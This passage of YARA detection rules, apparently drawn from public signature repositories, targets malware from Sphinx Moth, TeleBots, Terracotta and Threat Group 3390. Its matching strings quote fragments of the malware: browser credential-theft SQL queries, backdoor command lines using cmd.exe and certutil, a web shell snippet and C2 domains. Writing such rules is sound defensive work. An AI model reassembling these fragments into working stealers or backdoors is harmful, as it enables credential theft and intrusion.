\"https://github.com/Yara-Rules/rules\"\n        original_name = \"Sphinx_Moth_h2t\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"%s <proxy ip> <proxy port> <target ip> <target port> <cmd> [arg1 cmd] ... [argX cmd]\" fullword ascii\n        $s1 = \"[-] Error in connection() %d - %s\" fullword ascii\n        $s2 = \"[-] Child process exit.\" fullword ascii\n        $s3 = \"POST http://%s:%s/ HTTP/1.1\" fullword ascii\n        $s4 = \"pipe() to\" fullword ascii\n        $s5 = \"pipe() from\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 156KB and ($x1 or all of ($s*))\n}\n\nrule SphinxMoth_iastor32\n{\n    meta:\n        description = \"Sphinx Moth threat group file iastor32.exe\"\n        ref = \"www.kudelskisecurity.com\"\n        threat_names = \"Sphinx Moth\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kudelski Security - Nagravision SA\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Sphinx_Moth_iastor32\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"MIIEpQIBAAKCAQEA4lSvv/W1Mkz38Q3z+EzJBZRANzKrlxeE6/UXWL67YtokF2nN\" fullword ascii\n        $s1 = \"iAeS3CCA4wli6+9CIgX8SAiXd5OezHvI1jza61z/flsqcC1IP//gJVt16nRx3s9z\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2000KB and all of them\n}\n\nrule SphinxMoth_kerberos32\n{\n    meta:\n        description = \"Sphinx Moth threat group file kerberos32.dll\"\n        ref = \"www.kudelskisecurity.com\"\n        threat_names = \"Sphinx Moth\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kudelski Security - Nagravision SA (modified by Florian Roth)\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Sphinx_Moth_kerberos32\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"%WINDIR%\\\\ativpsrz.bin\" fullword ascii\n        $x2 = \"%WINDIR%\\\\ativpsrn.bin\" fullword ascii\n        $x3 = \"kerberos32.dll\" fullword wide\n        $x4 = \"KERBEROS64.dll\" fullword ascii\n        $x5 = \"kerberos%d.dll\" fullword ascii\n        $s1 = \"\\\\\\\\.\\\\pipe\\\\lsassp\" fullword ascii\n        $s2 = \"LSASS secure pipe\" fullword ascii\n        $s3 = \"NullSessionPipes\" fullword ascii\n        $s4 = \"getlog\" fullword ascii\n        $s5 = \"startlog\" fullword ascii\n        $s6 = \"stoplog\" fullword ascii\n        $s7 = \"Unsupported OS (%d)\" fullword ascii\n        $s8 = \"Unsupported OS (%s)\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and (2 of ($x*) or all of ($s*))\n}\n\nrule SphinxMoth_kerberos64\n{\n    meta:\n        description = \"Sphinx Moth threat group file kerberos64.dll\"\n        ref = \"www.kudelskisecurity.com\"\n        threat_names = \"Sphinx Moth\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kudelski Security - Nagravision SA (modified by Florian Roth)\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Sphinx_Moth_kerberos64\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"KERBEROS64.dll\" fullword ascii\n        $s1 = \"zeSecurityDescriptor\" fullword ascii\n        $s2 = \"SpGetInfo\" fullword ascii\n        $s3 = \"SpShutdown\" fullword ascii\n        $op0 = { 75 05 e8 6a c7 ff ff 48 8b 1d 47 d6 00 00 33 ff }\n        $op1 = { 48 89 05 0c 2b 01 00 c7 05 e2 29 01 00 09 04 00 }\n        $op2 = { 48 8d 3d e3 ee 00 00 ba 58 }\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 406KB and all of ($s*) and 1 of ($op*)\n}\n\nrule SphinxMoth_nvcplex\n{\n    meta:\n        description = \"Sphinx Moth threat group file nvcplex.dat\"\n        ref = \"www.kudelskisecurity.com\"\n        threat_names = \"Sphinx Moth\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Kudelski Security - Nagravision SA\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Sphinx_Moth_nvcplex\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"mshtaex.exe\" fullword wide\n        $op0 = { 41 8b cc 44 89 6c 24 28 48 89 7c 24 20 ff 15 d3 }\n        $op1 = { 48 3b 0d ad 8f 00 00 74 05 e8 ba f5 ff ff 48 8b }\n        $op2 = { 8b ce e8 49 47 00 00 90 8b 43 04 89 05 93 f1 00 }\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 214KB and all of them\n}\n\nrule TA459_Malware_May17_1\n{\n    meta:\n        description = \"TA459 related malware\"\n        ref = \"https://goo.gl/RLf9qU\"\n        threat_names = \"TA459\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TA459_Malware_May17_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s3 = \"xtsewy\" fullword ascii\n        $s6 = \"CW&mhAklnfVULL\" ascii\n\n    condition:\n        (uint16(0) == 0x6152 and filesize < 800KB and all of them)\n}\n\nrule TA459_Malware_May17_2\n{\n    meta:\n        description = \"TA459 related malware\"\n        ref = \"https://goo.gl/RLf9qU\"\n        threat_names = \"TA459\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TA459_Malware_May17_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a1 = \"Mcutil.dll\" fullword ascii\n        $a2 = \"mcut.exe\" fullword ascii\n        $s1 = \"Software\\\\WinRAR SFX\" fullword ascii\n        $s2 = \"AYou may need to run this self-extracting archive as administrator\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 900KB and all of ($a*) and 1 of ($s*))\n}\n\nrule TeleBots_IntercepterNG\n{\n    meta:\n        description = \"TeleBots malware - IntercepterNG\"\n        ref = \"https://goo.gl/4if3HG\"\n        threat_names = \"TeleBots\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TeleBots_IntercepterNG\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Usage: %s iface_num\\\\dump [mode] [w] [-gw] [-t1 ip]\" fullword ascii\n        $s2 = \"Target%d found: %s - [%.2X-%.2X-%.2X-%.2X-%.2X-%.2X]\" fullword ascii\n        $s3 = \"3: passwords + files, no arp poison\" fullword ascii\n        $s4 = \"IRC Joining Keyed Channel intercepted\" fullword ascii\n        $s5 = \"-tX - set target ip\" fullword ascii\n        $s6 = \"w - save session to .pcap dump\" fullword ascii\n        $s7 = \"example: %s 1 1 -gw 192.168.1.1 -t1 192.168.1.3 -t2 192.168.1.5\" fullword ascii\n        $s8 = \"ORACLE8 DES Authorization intercepted\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 500KB and 1 of them) or (4 of them)\n}\n\nrule TeleBots_KillDisk_1\n{\n    meta:\n        description = \"TeleBots malware - KillDisk\"\n        ref = \"https://goo.gl/4if3HG\"\n        threat_names = \"TeleBots\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TeleBots_KillDisk_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Plug-And-Play Support Service\" fullword wide\n        $s2 = \" /c \\\"echo Y|\" fullword wide\n        $s3 = \"-set=06.12.2016#09:30 -est=1410\" fullword ascii\n        $s4 = \"%d.%d.%d#%d:%d\" fullword ascii\n        $s5 = \" /T /C /G \" fullword wide\n        $s6 = \"[-] > %ls\" fullword wide\n        $s7 = \"[+] > %ls\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 500KB and 4 of them) or (6 of them)\n}\n\nrule TeleBots_KillDisk_2\n{\n    meta:\n        description = \"TeleBots malware - KillDisk\"\n        ref = \"https://goo.gl/4if3HG\"\n        threat_names = \"TeleBots\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TeleBots_KillDisk_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Plug-And-Play Support Service\" fullword wide\n        $s2 = \" /c \\\"echo Y|\" fullword wide\n        $s3 = \"%d.%d.%d#%d:%d\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 500KB and all of them)\n}\n\nrule TeleBots_CredRaptor_Password_Stealer\n{\n    meta:\n        description = \"TeleBots malware - CredRaptor Password Stealer\"\n        ref = \"https://goo.gl/4if3HG\"\n        threat_names = \"TeleBots\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TeleBots_CredRaptor_Password_Stealer\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"C:\\\\Documents and Settings\\\\Administrator\\\\Desktop\\\\GetPAI\\\\Out\\\\IE.pdb\" fullword ascii\n        $s2 = \"SELECT encryptedUsername, encryptedPassword, hostname,httpRealm FROM moz_logins\" fullword ascii\n        $s3 = \"SELECT ORIGIN_URL,USERNAME_VALUE,PASSWORD_VALUE FROM LOGINS\" fullword ascii\n        $s4 = \".\\\\PAI\\\\IEforXPpasswords.txt\" fullword ascii\n        $s5 = \"\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\" fullword ascii\n        $s6 = \"Opera old version credentials\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and 2 of them) or (4 of them)\n}\n\nrule TeleBots_VBS_Backdoor_1\n{\n    meta:\n        description = \"TeleBots malware - VBS Backdoor\"\n        ref = \"https://goo.gl/4if3HG\"\n        threat_names = \"TeleBots\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TeleBots_VBS_Backdoor_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"cmd = \\\"cmd.exe /c \\\" + arg + \\\" >\\\" + outfile +\\\" 2>&1\\\"\" fullword ascii\n        $s2 = \"GetTemp = \\\"c:\\\\WINDOWS\\\\addins\\\"\" fullword ascii\n        $s3 = \"elseif (arg0 = \\\"-dump\\\") Then\" fullword ascii\n        $s4 = \"decode = \\\"certutil -decode \\\" + source + \\\" \\\" + dest  \" fullword ascii\n\n    condition:\n        (uint16(0) == 0x6553 and filesize < 8KB and 1 of them) or (all of them)\n}\n\nrule TeleBots_VBS_Backdoor_2\n{\n    meta:\n        description = \"TeleBots malware - VBS Backdoor\"\n        ref = \"https://goo.gl/4if3HG\"\n        threat_names = \"TeleBots\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TeleBots_VBS_Backdoor_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"cmd = \\\"cmd.exe /c \\\" + arg + \\\" \\\" + arg2\" fullword ascii\n        $s2 = \"Dim WMI:  Set WMI = GetObject(\\\"winmgmts:\\\\\\\\.\\\\root\\\\cimv2\\\")\" fullword ascii\n        $s3 = \"cmd = \\\"certutil -encode -f \\\" + source + \\\" \\\" + dest\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x6944 and filesize < 30KB and 1 of them) or (2 of them)\n}\n\nrule TeleBots_Win64_Spy_KeyLogger_G\n{\n    meta:\n        description = \"TeleBots malware - Win64 Spy KeyLogger G\"\n        ref = \"https://goo.gl/4if3HG\"\n        threat_names = \"TeleBots\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"TeleBots_Win64_Spy_KeyLogger_G\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"C:\\\\WRK\\\\GHook\\\\gHook\\\\x64\\\\Debug\\\\gHookx64.pdb\" fullword ascii\n        $s2 = \"Install hooks error!\" fullword wide\n        $s4 = \"%ls%d.~tmp\" fullword wide\n        $s5 = \"[*]Window PID > %d: \" fullword wide\n        $s6 = \"Install hooks ok!\" fullword wide\n        $s7 = \"[!]Clipboard paste\" fullword wide\n        $s9 = \"[*] IMAGE : %ls\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 600KB and 1 of them) or (3 of them)\n}\n\nrule Terracota_Apolmy_Privesc_Trojan\n{\n    meta:\n        description = \"Apolmy Privilege Escalation Trojan used in APT Terracotta\"\n        ref = \"https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/\"\n        threat_names = \"Terracotta\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Apolmy_Privesc_Trojan\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"[%d] Failed, %08X\" fullword ascii\n        $s2 = \"[%d] Offset can not fetched.\" fullword ascii\n        $s3 = \"PowerShadow2011\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule Terracota_Mithozhan_Trojan\n{\n    meta:\n        description = \"Mitozhan Trojan used in APT Terracotta\"\n        ref = \"https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/\"\n        threat_names = \"Terracotta\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Mithozhan_Trojan\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"adbrowser\" fullword wide\n        $s2 = \"IJKLlGdmaWhram0vn36BgIOChYR3L45xcHNydXQvhmloa2ptbH8voYCDTw==\" fullword ascii\n        $s3 = \"EFGHlGdmaWhrL41sf36BgIOCL6R3dk8=\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule Terracota_RemoteExec_Tool\n{\n    meta:\n        description = \"Remote Access Tool used in APT Terracotta\"\n        ref = \"https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/\"\n        threat_names = \"Terracotta\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"RemoteExec_Tool\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"cmd.exe /q /c \\\"%s\\\"\" fullword ascii\n        $s1 = \"\\\\\\\\.\\\\pipe\\\\%s%s%d\" fullword ascii\n        $s2 = \"This is a service executable! Couldn't start directly.\" fullword ascii\n        $s3 = \"\\\\\\\\.\\\\pipe\\\\TermHlp_communicaton\" fullword ascii\n        $s4 = \"TermHlp_stdout\" fullword ascii\n        $s5 = \"TermHlp_stdin\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 75KB and 4 of ($s*)\n}\n\nrule Terracota_LiuDoor_Malware_1\n{\n    meta:\n        description = \"Liudoor Trojan used in Terracotta APT\"\n        ref = \"https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/\"\n        threat_names = \"Terracotta\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"LiuDoor_Malware_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"svchostdllserver.dll\" fullword ascii\n        $s2 = \"SvcHostDLL: RegisterServiceCtrlHandler %S failed\" fullword ascii\n        $s3 = \"\\\\nbtstat.exe\" fullword ascii\n        $s4 = \"DataVersionEx\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 150KB and all of them\n}\n\nrule Terracota_LiuDoor_Malware_2\n{\n    meta:\n        description = \"Liudoor Trojan used in Terracotta APT\"\n        ref = \"https://blogs.rsa.com/terracotta-vpn-enabler-of-advanced-threat-anonymity/\"\n        threat_names = \"Terracotta\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"LiuDoor_Malware_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"svchostdllserver.dll\" fullword ascii\n        $s1 = \"Lpykh~mzCCRv|mplpykCCHvq{phlCC\\\\jmmzqkIzmlvpqCC\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule Terracota_liudoor\n{\n    meta:\n        description = \"Liudoor daemon backdoor\"\n        threat_names = \"Terracotta\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"RSA FirstWatch\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"liudoor\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $string0 = \"Succ\"\n        $string1 = \"Fail\"\n        $string2 = \"pass\"\n        $string3 = \"exit\"\n        $string4 = \"svchostdllserver.dll\"\n        $string5 = \"L$,PQR\"\n        $string6 = \"0/0B0H0Q0W0k0\"\n        $string7 = \"QSUVWh\"\n        $string8 = \"Ht Hu[\"\n\n    condition:\n        all of them\n}\n\nrule ThreatGroup3390_HttpBrowser_RAT_dropper_Gen1\n{\n    meta:\n        description = \"Threat Group 3390 APT Sample - HttpBrowser RAT Dropper\"\n        ref = \"http://snip.ly/giNB\"\n        threat_names = \"Threat Group 3390, APT27\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"HttpBrowser_RAT_dropper_Gen1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"1001=cmd.exe\" fullword ascii\n        $x2 = \"1003=ShellExecuteA\" fullword ascii\n        $x3 = \"1002=/c del /q %s\" fullword ascii\n        $x4 = \"1004=SetThreadPriority\" fullword ascii\n        $op0 = { e8 71 11 00 00 83 c4 10 ff 4d e4 8b f0 78 07 8b }\n        $op1 = { e8 85 34 00 00 59 59 8b 86 b4 }\n        $op2 = { 8b 45 0c 83 38 00 0f 84 97 }\n        $op3 = { 8b 45 0c 83 38 00 0f 84 98 }\n        $op4 = { 89 7e 0c ff 15 a0 50 40 00 59 8b d8 6a 20 59 8d }\n        $op5 = { 56 8d 85 cd fc ff ff 53 50 88 9d cc fc ff ff e8 }\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and all of ($x*) and 1 of ($op*)\n}\n\nrule ThreatGroup3390_HttpBrowser_RAT_Sample1\n{\n    meta:\n        description = \"Threat Group 3390 APT Sample - HttpBrowser RAT Sample update.hancominc.com\"\n        ref = \"http://snip.ly/giNB\"\n        threat_names = \"Threat Group 3390, APT27\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"HttpBrowser_RAT_Sample1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"update.hancominc.com\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and $s0\n}\n\nrule ThreatGroup3390_HttpBrowser_RAT_Sample2\n{\n    meta:\n        description = \"Threat Group 3390 APT Sample - HttpBrowser RAT Sample\"\n        ref = \"http://snip.ly/giNB\"\n        threat_names = \"Threat Group 3390, APT27\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"HttpBrowser_RAT_Sample2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"nKERNEL32.DLL\" fullword wide\n        $s1 = \"WUSER32.DLL\" fullword wide\n        $s2 = \"mscoree.dll\" fullword wide\n        $s3 = \"VPDN_LU.exeUT\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 250KB and all of them\n}\n\nrule ThreatGroup3390_HttpBrowser_RAT_Gen\n{\n    meta:\n        description = \"Threat Group 3390 APT Sample - HttpBrowser RAT Generic\"\n        ref = \"http://snip.ly/giNB\"\n        threat_names = \"Threat Group 3390, APT27\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"HttpBrowser_RAT_Gen\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"%d|%s|%04d/%02d/%02d %02d:%02d:%02d|%ld|%d\" fullword wide\n        $s1 = \"HttpBrowser/1.0\" fullword wide\n        $s2 = \"set cmd : %s\" ascii fullword\n        $s3 = \"\\\\config.ini\" wide fullword\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 45KB and filesize > 20KB and all of them\n}\n\nrule ThreatGroup3390_PlugX_NvSmartMax_Gen\n{\n    meta:\n        description = \"Threat Group 3390 APT Sample - PlugX NvSmartMax Generic\"\n        ref = \"http://snip.ly/giNB\"\n        threat_names = \"Threat Group 3390, APT27\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"PlugX_NvSmartMax_Gen\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"NvSmartMax.dll\" fullword ascii\n        $s1 = \"NvSmartMax.dll.url\" fullword ascii\n        $s2 = \"Nv.exe\" fullword ascii\n        $s4 = \"CryptProtectMemory failed\" fullword ascii\n        $s5 = \"CryptUnprotectMemory failed\" fullword ascii\n        $s7 = \"r%.*s(%d)%s\" fullword wide\n        $s8 = \" %s CRC \" fullword wide\n        $op0 = { c6 05 26 49 42 00 01 eb 4a 8d 85 00 f8 ff ff 50 }\n        $op1 = { 8d 85 c8 fe ff ff 50 8d 45 c8 50 c6 45 47 00 e8 }\n        $op2 = { e8 e6 65 00 00 50 68 10 43 41 00 e8 56 84 00 00 }\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 800KB and all of ($s*) and 1 of ($op*)\n}\n\nrule ThreatGroup3390_HttpBrowser_RAT_dropper_Gen2\n{\n    meta:\n        description = \"Threat Group 3390 APT Sample - HttpBrowser RAT Dropper\"\n        ref = \"http://snip.ly/giNB\"\n        threat_names = \"Threat Group 3390, APT27\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"HttpBrowser_RAT_dropper_Gen2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"navlu.dll.urlUT\" fullword ascii\n        $s2 = \"VPDN_LU.exeUT\" fullword ascii\n        $s3 = \"pnipcn.dllUT\" fullword ascii\n        $s4 = \"\\\\ssonsvr.exe\" fullword ascii\n        $s5 = \"/c del /q %s\" fullword ascii\n        $s6 = \"\\\\setup.exe\" fullword ascii\n        $s7 = \"msi.dllUT\" fullword ascii\n        $op0 = { 8b 45 0c 83 38 00 0f 84 98 }\n        $op1 = { e8 dd 07 00 00 ff 35 d8 fb 40 00 8b 35 7c a0 40 }\n        $op2 = { 83 fb 08 75 2c 8b 0d f8 af 40 00 89 4d dc 8b 0d }\n        $op3 = { c7 43 18 8c 69 40 00 e9 da 01 00 00 83 7d f0 00 }\n        $op4 = { 6a 01 e9 7c f8 ff ff bf 1a 40 00 96 1b 40 00 01 }\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and 3 of ($s*) and 1 of ($op*)\n}\n\nrule ThreatGroup3390_Strings\n{\n    meta:\n        description = \"Threat Group 3390 APT - Strings\"\n        ref = \"http://snip.ly/giNB\"\n        threat_names = \"Threat Group 3390, APT27\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"ThreatGroup3390_Strings\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"\\\"cmd\\\" /c cd /d \\\"c:\\\\Windows\\\\Temp\\\\\\\"&copy\" ascii\n        $s2 = \"svchost.exe a -k -r -s -m5 -v1024000 -padmin-windows2014\"\n        $s3 = \"ren *.rar *.zip\" fullword ascii\n        $s4 = \"c:\\\\temp\\\\ipcan.exe\" fullword ascii\n        $s5 = \"<%eval(Request.Item(\\\"admin-na-google123!@#\" ascii\n\n    condition:\n        1 of them and filesize < 30KB\n}\n\nrule ThreatGroup3390_C2\n{\n    meta:\n        description = \"Threat Group 3390 APT - C2 Server\"\n        ref = \"http://snip.ly/giNB\"\n        threat_names = \"Threat Group 3390, APT27\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"ThreatGroup3390_C2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"api.apigmail.com\"\n        $s2 = \"apigmail.com\"\n        $s3 = \"backup.darkhero.org\"\n        $s4 = \"bel.updatawindows.com\"\n        $s5 = \"binary.update-onlines.org\"\n        $s6 = \"blackcmd.com\"\n        $s7 = \"castle.blackcmd.com\"\n        $s8 = \"ctcb.blackcmd.com\"\n        $s9 = \"darkhero.org\"\n        $s10 = \"dav.local-test.com\"\n        $s11 = \"test.local-test.com\"\n        $s12 = \"dev.local-test.com\"\n        $s13 = \"ocean.local-test.com\"\n        $s14 = \"ga.blackcmd.com\"\n        $s15 = \"helpdesk.blackcmd.com\"\n        $s16 = \"helpdesk.csc-na.com\"\n        $s17 = 